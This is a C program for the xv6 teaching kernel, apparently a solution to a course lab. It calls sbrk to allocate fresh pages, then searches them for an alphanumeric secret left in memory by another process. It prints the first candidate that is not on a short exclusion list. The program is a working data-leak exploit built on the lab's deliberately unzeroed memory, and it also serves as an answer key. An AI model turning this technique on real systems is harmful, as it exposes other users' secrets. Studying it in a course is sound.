#include "kernel/types.h"
#include "kernel/stat.h"
#include "user/user.h"

int
is_alnum(char c)
{
  return (c >= 'a' && c <= 'z') ||
         (c >= 'A' && c <= 'Z') ||
         (c >= '0' && c <= '9');
}

int
is_excluded(const char *s)
{
  return strcmp(s, "secret") == 0 ||
         strcmp(s, "attack") == 0 ||
         strcmp(s, "sh") == 0 ||
         strcmp(s, "init") == 0;
}

int
main(int argc, char *argv[])
{
  int npages = 64;
  int page_size = 4096;
  int total_bytes = npages * page_size;

  char *mem = sbrk(total_bytes);
  if (mem == (char *)-1) {
    exit(1);
  }

  for (int p = 0; p < npages; p++) {
    char *page_start = mem + p * page_size;
    if (is_alnum(page_start[0])) {
      int len = 0;
      int valid = 1;
      while (len < page_size && page_start[len] != '\0') {
        if (!is_alnum(page_start[len])) {
          valid = 0;
          break;
        }
        len++;
      }
      if (valid && len > 0 && len < page_size && page_start[len] == '\0') {
        if (!is_excluded(page_start)) {
          printf("%s\n", page_start);
          exit(0);
        }
      }
    }
  }

  for (int i = 0; i < total_bytes - 7; i++) {
    if (mem[i] == 's' && mem[i+1] == 'e' && mem[i+2] == 'c' &&
        mem[i+3] == 'r' && mem[i+4] == 'e' && mem[i+5] == 't' && mem[i+6] == '\0') {
      int start = i + 7;
      while (start < total_bytes && mem[start] == '\0') {
        start++; 
      }
      if (start < total_bytes && is_alnum(mem[start])) {
        int end = start;
        int valid = 1;
        while (end < total_bytes && mem[end] != '\0') {
          if (!is_alnum(mem[end])) {
            valid = 0;
            break;
          }
          end++;
        }
        if (valid && end > start && end < total_bytes && mem[end] == '\0') {
          char *candidate = &mem[start];
          if (!is_excluded(candidate)) {
            printf("%s\n", candidate);
            exit(0);
          }
        }
      }
    }
  }

  exit(0);
}